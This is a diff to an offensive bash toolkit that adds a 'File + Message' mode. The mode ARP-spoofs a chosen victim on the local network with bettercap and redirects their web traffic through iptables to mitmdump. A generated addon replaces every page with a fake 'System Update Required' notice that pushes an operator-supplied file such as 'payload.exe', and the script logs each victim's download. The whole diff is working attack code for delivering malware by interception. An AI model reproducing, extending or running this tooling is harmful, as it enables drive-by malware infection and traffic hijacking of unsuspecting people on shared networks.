@@ -12,6 +12,7 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 HANDSHAKE_DIR="$SCRIPT_DIR/handshakes"
 CRED_FILE="$SCRIPT_DIR/credentials.txt"
 CRED_HOOK="$SCRIPT_DIR/credential_hook.js"
+CLICK_LOG="$SCRIPT_DIR/clicks.txt"
 
 MITM_PID=""
 BC_PID=""
@@ -385,9 +386,10 @@ print_section "STEP 2 • Select Mode"
 echo -e "  ${CYAN}[1]${NC} MITM Attack          ${DIM}(ARP spoof + sniff + credential capture)${NC}"
 echo -e "  ${CYAN}[2]${NC} Handshake Capture    ${DIM}(scan WiFi, capture + verify)${NC}"
 echo -e "  ${CYAN}[3]${NC} URL Redirect         ${DIM}(ARP spoof + mitmdump + iptables)${NC}"
-echo -e "  ${CYAN}[4]${NC} Exit"
+echo -e "  ${CYAN}[4]${NC} File + Message       ${DIM}(ARP spoof + mitmdump + iptables)${NC}"
+echo -e "  ${CYAN}[5]${NC} Exit"
 echo
-read -p "$(echo -e "${MAGENTA}➜${NC} Option [1-4]: ")" MODE
+read -p "$(echo -e "${MAGENTA}➜${NC} Option [1-5]: ")" MODE
 
 if [[ "$MODE" == "1" ]]; then
     print_section "MITM Mode • Network Discovery"
@@ -799,6 +801,219 @@ EOF
     cleanup_all
 
 elif [[ "$MODE" == "4" ]]; then
+    print_section "File + Message Mode • ARP spoof + mitmdump"
+
+    AUTO_GW=$(detect_gateway)
+    if [[ -z "$AUTO_GW" ]]; then
+        print_warn "No default gateway detected."
+        read -p "$(echo -e "${MAGENTA}➜${NC} Enter gateway IP manually: ")" AUTO_GW
+        if [[ -z "$AUTO_GW" ]]; then print_err "Gateway required."; exit 1; fi
+    fi
+    print_info "Gateway: ${BOLD}${AUTO_GW}${NC}"
+
+    MY_IP=$(detect_my_ip)
+    if [[ -z "$MY_IP" ]]; then
+        print_err "Could not detect your local IP. Aborting."
+        exit 1
+    fi
+    print_info "Your IP: ${BOLD}${MY_IP}${NC}"
+
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    print_ok "IP Forwarding enabled."
+
+    print_info "Starting network probe (25s)..."
+    MITM_LOG="/tmp/mitm_probe_$$.log"
+    bettercap -iface "$IFACE" -gateway-override "$AUTO_GW" -eval "
+        set net.probe.throttle 2;
+        net.probe on;
+        sleep 25;
+        net.show;
+        sleep 3;
+        net.probe off;
+        exit
+    " > "$MITM_LOG" 2>&1
+
+    mapfile -t HOSTS < <(
+        grep -E '^\│' "$MITM_LOG" | \
+        awk -F'│' '{
+            gsub(/^[ \t]+|[ \t]+$/, "", $2);
+            gsub(/^[ \t]+|[ \t]+$/, "", $3);
+            gsub(/^[ \t]+|[ \t]+$/, "", $4);
+            if ($2 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $3 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) {
+                print $2 "|" $3 "|" $4
+            }
+        }'
+    )
+    rm -f "$MITM_LOG"
+
+    if [[ ${#HOSTS[@]} -eq 0 ]]; then
+        print_warn "Bettercap found no hosts. Reading ARP table..."
+        mapfile -t HOSTS < <(
+            ip neigh show | awk '$3 == "lladdr" && $NF != "FAILED" {print $1 "|" $5 "|" "-"}'
+        )
+    fi
+
+    if [[ ${#HOSTS[@]} -eq 0 ]]; then
+        print_err "No hosts found. AP isolation?"
+        exit 1
+    fi
+
+    print_section "Discovered Hosts"
+    echo
+    printf "  ${BOLD}%-4s %-18s %-20s %-20s${NC}\n" "No." "IP" "MAC" "Vendor/Name"
+    echo "  ──────────────────────────────────────────────────────────────"
+    i=1
+    for entry in "${HOSTS[@]}"; do
+        IFS='|' read -r ip mac name <<< "$entry"
+        printf "  ${CYAN}%-4s${NC} %-18s %-20s %-20s\n" "$i" "$ip" "$mac" "$name"
+        ((i++))
+    done
+
+    echo
+    read -p "$(echo -e "${MAGENTA}➜${NC} Select target IP number: ")" HOST_CHOICE
+    IFS='|' read -r TARGET_IP _ _ <<< "${HOSTS[$((HOST_CHOICE-1))]}"
+    if [[ -z "$TARGET_IP" ]]; then
+        print_err "Invalid selection."
+        exit 1
+    fi
+    print_ok "Target: ${BOLD}${TARGET_IP}${NC}"
+
+    TARGET_MAC=$(force_resolve_mac "$TARGET_IP" "$IFACE")
+    if [[ -z "$TARGET_MAC" ]]; then
+        print_err "Target MAC unresolved."
+        exit 1
+    fi
+    print_ok "Target MAC: ${BOLD}${TARGET_MAC}${NC}"
+
+    print_info "Enter the message to show to the victim."
+    read -p "$(echo -e "${MAGENTA}➜${NC} Message: ")" USER_MSG
+    [[ -z "$USER_MSG" ]] && USER_MSG="System update required. Please download the file below."
+
+    print_info "Enter the file path (full path or file name in script folder)."
+    print_info "Example: payload.exe"
+    print_info "Example: /home/user/payload.exe"
+    read -e -p "$(echo -e "${MAGENTA}➜${NC} File path: ")" USER_FILE_PATH
+    if [[ -z "$USER_FILE_PATH" ]]; then
+        print_err "File path required."
+        exit 1
+    fi
+
+    if [[ ! -f "$USER_FILE_PATH" ]]; then
+        if [[ -f "$SCRIPT_DIR/$USER_FILE_PATH" ]]; then
+            USER_FILE_PATH="$SCRIPT_DIR/$USER_FILE_PATH"
+        else
+            print_warn "File not found: $USER_FILE_PATH"
+            print_info "Place the file there or continue (download will fail)."
+            read -p "$(echo -e "${MAGENTA}➜${NC} Continue anyway? [y/N]: ")" CONT
+            if [[ "$CONT" != "y" && "$CONT" != "Y" ]]; then
+                exit 1
+            fi
+        fi
+    fi
+
+    USER_FILE=$(basename "$USER_FILE_PATH")
+
+    rm -f "$CLICK_LOG"
+
+    print_ok "File: ${BOLD}${USER_FILE}${NC}"
+FILE_ADDON="$SCRIPT_DIR/file_message_addon.py"
+cat > "$FILE_ADDON" << EOF
+from mitmproxy import http
+import os
+import time
+
+MESSAGE = """$USER_MSG"""
+FILE_NAME = "$USER_FILE"
+FILE_PATH = "$USER_FILE_PATH"
+CLICK_LOG = "$CLICK_LOG"
+
+def log_click(client_ip):
+    try:
+        with open(CLICK_LOG, "a") as f:
+            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {client_ip} | {FILE_NAME}\n")
+        print(f"[+] Victim {client_ip} downloaded {FILE_NAME}")
+    except Exception:
+        pass
+
+def request(flow: http.HTTPFlow) -> None:
+    if "text/html" not in flow.request.headers.get("Accept", ""):
+        return
+
+    if flow.request.path == f"/{FILE_NAME}":
+        client_ip = flow.client_conn.peername[0] if flow.client_conn.peername else "unknown"
+        log_click(client_ip)
+
+        try:
+            with open(FILE_PATH, "rb") as f:
+                file_content = f.read()
+            flow.response = http.Response.make(
+                200, file_content,
+                {"Content-Type": "application/octet-stream",
+                 "Content-Disposition": f"attachment; filename={FILE_NAME}"}
+            )
+        except FileNotFoundError:
+            flow.response = http.Response.make(404, b"File not found")
+        return
+
+    html_content = f"""
+    <!DOCTYPE html>
+    <html>
+    <head><title>Update Required</title></head>
+    <body style="font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0;">
+        <div style="max-width: 600px; margin: auto; background: white; padding: 40px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.2);">
+            <h1 style="color: #d9534f;">System Update Required</h1>
+            <h2>{MESSAGE}</h2>
+            <p style="font-size: 18px;">Please download the file below:</p>
+            <p><a href="/{FILE_NAME}" style="display: inline-block; padding: 15px 30px; background: #0275d8; color: white; text-decoration: none; border-radius: 5px; font-size: 20px;">Download {FILE_NAME}</a></p>
+        </div>
+    </body>
+    </html>
+    """
+    flow.response = http.Response.make(
+        200,
+        html_content.encode("utf-8"),
+        {"Content-Type": "text/html"}
+    )
+EOF
+
+    print_ok "Addon generated: ${BOLD}${FILE_ADDON}${NC}"
+    print_info "Message: ${BOLD}${USER_MSG}${NC}"
+    print_info "File: ${BOLD}${USER_FILE}${NC}"
+
+    print_info "Setting up iptables redirect to mitmdump (port 8080)..."
+    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
+    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080
+    print_ok "iptables rules added."
+
+    mitmdump -s "$FILE_ADDON" --mode transparent &
+    MITM_PID=$!
+    print_ok "mitmdump running (PID: $MITM_PID)"
+
+    bettercap -iface "$IFACE" -gateway-override "$AUTO_GW" -eval "
+        set arp.spoof.fullduplex true;
+        set arp.spoof.targets $TARGET_IP;
+        set arp.spoof.internal false;
+        arp.spoof on
+    " &
+    BC_PID=$!
+    print_ok "Bettercap ARP spoof running (PID: $BC_PID)"
+
+    print_info "Press Enter to stop."
+    read -p ""
+
+    print_section "Download Click Report"
+    if [[ -f "$CLICK_LOG" ]] && [[ -s "$CLICK_LOG" ]]; then
+        TOTAL_CLICKS=$(wc -l < "$CLICK_LOG")
+        print_ok "${GREEN}${BOLD}Total clicks: $TOTAL_CLICKS${NC}"
+        echo
+        cat "$CLICK_LOG"
+    else
+        print_warn "No download clicks recorded."
+    fi
+
+    cleanup_all
+
+elif [[ "$MODE" == "5" ]]; then
     print_info "Exiting."
     exit 0
 else
